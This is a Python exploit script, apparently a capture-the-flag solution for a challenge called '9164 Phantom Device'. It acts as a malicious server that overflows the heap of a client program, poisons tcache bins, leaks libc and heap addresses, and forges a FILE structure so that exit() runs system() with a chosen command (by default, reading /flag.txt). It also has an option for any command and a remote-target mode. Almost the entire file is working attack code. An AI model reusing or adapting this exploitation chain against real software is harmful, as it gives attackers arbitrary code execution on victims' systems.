#!/usr/bin/env python3
"""9164 Phantom Device - two-hop loop-write FSOP, built on the live-verified
solve4 heap layout (read_dir big body -> file_info parse carved out of it).

afc_receive_data mallocs `entire_len` then does ONE recv(this_len).  When
this_len > entire_len the whole this_len lands in that single recv, so we write
~1 KB at any address a poisoned tcache bin returns:

  hop1 @ libc+0x2042f0 : L1 bytes (faithful libc .data image + forged header)
  hop2 @ libc+0x2046f0 : L2 bytes (fake FILE on _IO_2_1_stdin_ + wide data +
                                   vtable -> system(fp))

_IO_2_1_stdin_ is the last FILE of the _IO_list_all chain, so exit() ->
_IO_cleanup -> _IO_flush_all -> _IO_wfile_overflow -> _IO_wdoallocbuf ->
__doallocate(fp) == system(fp), with fp->_flags = the command string.

Heap (all live-verified offsets in LANE-D):
  R1 read_dir "/DCIM" big body -> [B 0x420][array 0x40][5 strings 0x50]
  R3 file_info     parse_body  -> X 0x110 carved from B, then array 0x30 +
                                  3 tokens 0x30 right after X
  poison str5 (0x50 bin head) from the R1 array overflow   -> hop1 chunk
  poison list (0x30 bin head) from X's overflow            -> hop2 chunk
"""
import os, socket, struct, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
CHAL = HERE
FILES = os.path.join(CHAL, 'files')
LIBDIR = os.path.join(HERE, 'libdir_ubuntu')
CLIENT = os.path.join(FILES, 'client')
LOADER = os.path.join(LIBDIR, 'ld-linux-x86-64.so.2')
MAGIC = b'CFA6LPAA'

sys.path.insert(0, HERE)
import exploit_local as E
import solve2 as S

OFF_ARENA_BIN0 = 0x204b20
U1 = 0x2042f0
L1 = 0x400
U2 = U1 + L1              # 0x2046f0
L2 = 0x3c0
OFF_WFILE_JUMPS = 0x203228
OFF_SYSTEM = 0x58750

# heap offsets relative to the [heap] base -- measured for this exact sequence
P_X = 0x17c0          # X chunk (0x110) - R3 reply buffer
P_LIST = 0x18d0       # file_info array chunk (0x30) == 0x30 bin head
P_R1ARR = 0x1be0      # R1 read_dir array chunk (0x40) == 0x40 bin head
P_STR5 = 0x1da0       # 0x60 bin head (last read_dir string)

R_X = 0x100           # -> 0x110
R_TOK = 0x28          # -> 0x30
R_STR = 0x58          # -> 0x60
R_R1ARR = 0x38        # -> 0x40


def parse_body(n=0x100):
    """3 NUL-terminated tokens of 0x28 -> strdup(0x29) -> 0x30 chunks, array 0x20 -> 0x30."""
    z = bytes(1)
    b = b''
    for i in range(3):
        b += bytes([0x61 + i]) * 0x27 + z
    b += b'D' * (n - len(b))
    assert b.count(z) == 3 and len(b) == n
    return b


def build_image(start, size, libc, patches):
    blob, rels, relr = E.libc_image(start, size)
    for o, add in rels:
        struct.pack_into('<Q', blob, o - start, libc + add)
    for va in relr:
        o = va - start
        struct.pack_into('<Q', blob, o, struct.unpack_from('<Q', blob, o)[0] + libc)
    for va, val, fmt in patches:
        if fmt == 's':
            blob[va - start:va - start + len(val)] = val
        else:
            struct.pack_into(fmt, blob, va - start, val)
    return bytes(blob)


def hop1_image(libc):
    if os.environ.get('TEST_H1B'):
        return build_image(U1, L1, libc, [(U2 - 8, 0xdead0000, '<Q')])
    if os.environ.get('TEST_H1'):
        # __exit_funcs -> wild : exit() must SIGSEGV if this write lands
        return build_image(U1, L1, libc, [(U2 - 8, 0x41, '<Q'),
                                          (0x204668, 0x4141414141414141, '<Q')])
    return build_image(U1, L1, libc, [(U2 - 8, 0x41, '<Q')])


def hop2_image(libc, cmd):
    raw = b'  ' + (cmd.encode() if isinstance(cmd, str) else cmd)
    assert len(raw) < 0x60
    f = bytearray(0xe0)
    f[0:len(raw)] = raw
    struct.pack_into('<Q', f, 0x68, 0)
    struct.pack_into('<Q', f, 0x80, 0)
    struct.pack_into('<Q', f, 0x88, libc + U2 + 0x398)      # _lock
    struct.pack_into('<Q', f, 0xA0, libc + U2 + 0x2d0)      # _wide_data
    struct.pack_into('<Q', f, 0xC0, 1)                      # _mode
    struct.pack_into('<Q', f, 0xD8, libc + OFF_WFILE_JUMPS)  # vtable
    if os.environ.get('TEST_H2'):
        # _IO_2_1_stdin_._lock -> wild : _IO_flush_all must SIGSEGV if write lands
        return build_image(U2, L2, libc, [(0x204968, 0x4141414141414141, '<Q')])
    return build_image(U2, L2, libc, [
        (0x2048e0, bytes(f), 's'),
        (U2 + 0x2d0 + 0x18, 0, '<Q'),
        (U2 + 0x2d0 + 0x20, 1, '<Q'),
        (U2 + 0x2d0 + 0x30, 0, '<Q'),
        (U2 + 0x2d0 + 0xE0, libc + U2 + 0x320, '<Q'),
        (U2 + 0x320 + 0x68, (0x4141414141414141 if os.environ.get('TEST_H3') else libc + OFF_SYSTEM), '<Q'),
    ])


def solve_heap(handle):
    """handle = PROTECT_PTR(H+P_STR5+0x10, H+P_STR4+0x10) low byte clobbered."""
    p = P_STR5 + 0x10
    pn = (P_STR5 - 0x50) + 0x10
    q = pn - 0x1000 * (p >> 12)
    E_ = handle & ~0xff
    sols = []
    for d in range(256):
        V = d | ((((E_ >> 8) & 0xf) ^ ((q >> 8) & 0xf)) << 8)
        for i in range(12, 64):
            V |= ((((E_ >> i) & 1) ^ ((V >> (i - 12)) & 1)) << i)
        if ((V ^ ((V << 12) + q)) & ~0xff) == E_ and (V << 12) < (1 << 48):
            sols.append((V - (p >> 12)) << 12)
    return sols


def recvn(s, n):
    b = b''
    while len(b) < n:
        d = s.recv(n - len(b))
        if not d:
            raise EOFError('client closed')
        b += d
    return b


def read_request(s):
    hdr = recvn(s, 40)
    if hdr[:8] != MAGIC:
        raise RuntimeError('bad magic %r' % hdr[:8])
    ent, thi, pn, op = struct.unpack('<QQQQ', hdr[8:40])
    return ent, thi, pn, op, (recvn(s, thi - 40) if thi > 40 else b'')


def reply(s, pn, op, body, ent, thi):
    s.sendall(MAGIC + struct.pack('<QQQQ', ent + 40, thi + 40, pn, op) + body)


def heap_base_of(pid):
    for line in open('/proc/%d/maps' % pid):
        if '[heap]' in line:
            return int(line.split('-')[0], 16)
    return None


def dump_bins(pid, tag):
    hb = heap_base_of(pid)
    with open('/proc/%d/mem' % pid, 'rb') as f:
        f.seek(hb)
        data = f.read(0x4000)
    tc = struct.unpack_from('<64H', data, 0x10)
    ent = struct.unpack_from('<64Q', data, 0x90)
    out = ['%#x:%d/u%#x' % (0x20 + i * 0x10, tc[i], ent[i] - hb) for i in range(64) if tc[i]]
    print('    [%s] H=%#x bins: %s' % (tag, hb, ' '.join(out)), flush=True)
    a = 0
    chunks = []
    while a < len(data) - 16:
        prev, size = struct.unpack_from('<QQ', data, a)
        sz = size & ~0xf
        if sz == 0 or sz % 16 or sz > 0x40000:
            chunks.append('brk@%#x' % (hb + a))
            break
        chunks.append('%#x:%#x' % (hb + a - hb, sz))
        a += sz
    print('    [%s] chunks: %s' % (tag, ' '.join(chunks[:26])), flush=True)


heap = 0


def main():
    global heap
    mode = sys.argv[1]
    cmd = 'cat /flag.txt>&0;echo __DONE__>&0'
    if '--cmd' in sys.argv:
        cmd = sys.argv[sys.argv.index('--cmd') + 1]
    verbose = '-v' in sys.argv
    if mode == 'local':
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        port = srv.getsockname()[1]
        srv.listen(1)
        env = dict(os.environ)
        env.pop('LD_LIBRARY_PATH', None)
        p = subprocess.Popen([LOADER, '--library-path', LIBDIR, CLIENT, '127.0.0.1', str(port)],
                             cwd=FILES, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL,
                             stderr=subprocess.PIPE, env=env)
        conn, _ = srv.accept()
        conn.settimeout(60)
    else:
        host, rport = sys.argv[2], int(sys.argv[3])
        conn = socket.create_connection((host, rport), timeout=15)
        conn.settimeout(60)
        p = None

    def log(*a):
        if verbose:
            print(*a, flush=True)

    libc = None
    try:
        r = read_request(conn); log('R0 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, b'', 0, 0)

        big = S.big_body()                       # 0x418 bytes, 5 tokens of 0x48
        r = read_request(conn); log('R1 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, big, len(big), len(big))
        time.sleep(0.12)
        conn.sendall(b'')

        r = read_request(conn); log('R2 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, b'', 0, 0)

        pb = parse_body()                        # 0x100 bytes, 3 tokens of 0x28 (0x30 chunks)
        r = read_request(conn); log('R3 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, pb, len(pb), len(pb))

        r = read_request(conn); log('R4 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, b'', 0, 0)
        if p is not None and verbose:
            dump_bins(p.pid, 'after R3')

        r = read_request(conn); log('R5 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, b'A', 1, 1)
        r = read_request(conn); log('R6 op=%d pn=%d' % (r[3], r[2]))
        h1 = struct.unpack('<Q', r[4][:8])[0]
        libc = ((h1 & ~0xff) | 0x20) - OFF_ARENA_BIN0
        if p is not None and verbose:
            real = None
            for line in open('/proc/%d/maps' % p.pid):
                if 'libc.so.6' in line and line.split()[2] == '00000000':
                    real = int(line.split('-')[0], 16)
            log('    h1=%#x libc=%#x real=%#x match=%s' % (h1, libc, real, real == libc))
        if libc & 0xfff or libc >> 48:
            raise RuntimeError('libc leak bad %#x' % libc)
        reply(conn, r[2], 2, b'', 0, 0)

        r = read_request(conn); log('R7 op=%d pn=%d' % (r[3], r[2]))
        reply(conn, r[2], 2, b'B', R_STR, 1)
        r = read_request(conn); log('R8 op=%d pn=%d (stall done)' % (r[3], r[2]))
        h2 = struct.unpack('<Q', r[4][:8])[0]
        sols = solve_heap(h2)
        log('    h2=%#x sols=%s' % (h2, [hex(x) for x in sols]))
        if p is not None and verbose:
            real = heap_base_of(p.pid)
            log('    real heap=%#x' % real)
            if len(sols) != 1:
                print('    !! solver disagrees; using /proc', flush=True)
                sols = [real]
        if len(sols) != 1:
            raise RuntimeError('heap solve failed: %s' % [hex(x) for x in sols])
        heap = sols[0]

        # R8: overflow from the R1 array (0x40) poisons the 0x50 bin head
        src = P_R1ARR + 0x10
        o = (P_STR5 + 0x10) - src
        n = o + 8
        b = bytearray(b'Z' * n)
        struct.pack_into('<Q', b, o - 0x10, 0)
        struct.pack_into('<Q', b, o - 8, 0x41)
        tgt1 = (heap + int(os.environ['TGT1_OFF'], 0)) if os.environ.get('TGT1_OFF') else (libc + U1)
        struct.pack_into('<Q', b, o, tgt1 ^ ((heap + P_STR5 + 0x10) >> 12))
        reply(conn, r[2], 2, bytes(b), R_R1ARR, len(b))
        log('    poison str5 (%d B) -> %#x' % (len(b), libc + U1))

        # R9: X overflow poisons the 0x30 bin head (file_info array)
        r = read_request(conn); log('R9 op=%d pn=%d' % (r[3], r[2]))
        tgt2 = (libc + int(os.environ['TGT2_OFF'], 0)) if os.environ.get('TGT2_OFF') else (libc + U2)
        if os.environ.get('TGT2_HOFF'):
            tgt2 = heap + int(os.environ['TGT2_HOFF'], 0)
        if os.environ.get('TGT2_RAW'):
            tgt2 = int(os.environ['TGT2_RAW'], 0)
        ov = bytearray(S.overflow_body(fd=((heap + P_LIST + 0x10) >> 12) ^ tgt2, size_list=0x41))
        reply(conn, r[2], 2, bytes(ov), R_X, len(ov))
        log('    poison list (%d B) -> %#x' % (len(ov), libc + U2))

        # ---- pipeline: queue pop1 / hop1 / pop2 / hop2 replies back-to-back
        # so every recv(this_len) finds its whole payload already in the socket
        # receive buffer.  Packet numbers are strictly sequential (R10=11..R13=14).
        img1 = hop1_image(libc)
        img2 = (b'A' * L2) if (os.environ.get('TGT2_OFF') or os.environ.get('TGT2_HOFF')) else hop2_image(libc, cmd)
        pn_R10 = r[2] + 1
        pipe = b''.join([
            MAGIC + struct.pack('<QQQQ', R_STR + 40, R_STR + 40, pn_R10, 2) + b'P' * R_STR,
            MAGIC + struct.pack('<QQQQ', R_STR + 40, len(img1) + 40, pn_R10 + 1, 2) + img1,
            MAGIC + struct.pack('<QQQQ', R_TOK + 40, R_TOK + 40, pn_R10 + 2, 2) + b'Q' * R_TOK,
            MAGIC + struct.pack('<QQQQ', R_TOK + 40, len(img2) + 40, pn_R10 + 3, 2) + img2,
        ])
        if os.environ.get('NOPIPE'):
            for i in range(10, 14):
                r = read_request(conn); log('R%d op=%d pn=%d' % (i, r[3], r[2]))
                ent = R_STR if i in (10, 11) else R_TOK
                body = [b'P' * R_STR, img1, b'Q' * R_TOK, img2][i - 10]
                reply(conn, r[2], 2, body, ent, len(body))
        else:
            conn.sendall(pipe)
            log('    pipelined %d B (pop1/hop1/pop2/hop2) -> %#x %#x' % (len(pipe), libc + U1, libc + U2))
            for i in range(10, 14):
                r = read_request(conn); log('R%d op=%d pn=%d' % (i, r[3], r[2]))
        if p is not None and verbose:
            with open('/proc/%d/mem' % p.pid, 'rb') as f:
                f.seek(libc + 0x2048e0)
                log('    [stdin now] %s' % f.read(24).hex())
            with open('/proc/%d/mem' % p.pid, 'rb') as f:
                f.seek(libc + U1)
                a = f.read(0x10)
                f.seek(libc + U2)
                b2 = f.read(0x10)
            log('    [hop1 @U1] %s' % a.hex())
            log('    [hop2 @U2] %s' % b2.hex())
    except Exception:
        import traceback
        traceback.print_exc()
    finally:
        if p is not None:
            try:
                p.stdin.write(b'echo X\n'); p.stdin.flush()
            except Exception:
                pass
            time.sleep(0.8)
            if p.poll() is None:
                p.kill()
            print('=== CLIENT rc=%s ===' % p.returncode)
            err = p.stderr.read() or b''
            print('=== CLIENT STDERR (%d) ===' % len(err))
            sys.stdout.write(err.decode('latin-1', 'replace'))
            print('')
        else:
            conn.settimeout(3.0)
            data = b''
            t0 = time.time()
            while time.time() - t0 < 20:
                try:
                    d = conn.recv(65536)
                except socket.timeout:
                    if b'CSCTF{' in data:
                        break
                    continue
                if not d:
                    print('(closed after %.2fs)' % (time.time() - t0))
                    break
                data += d
                sys.stdout.write(d.decode('latin-1', 'replace'))
                sys.stdout.flush()
                if b'CSCTF{' in data:
                    break
            print('\n=== TAIL (%d) ===' % len(data))


if __name__ == '__main__':
    main()
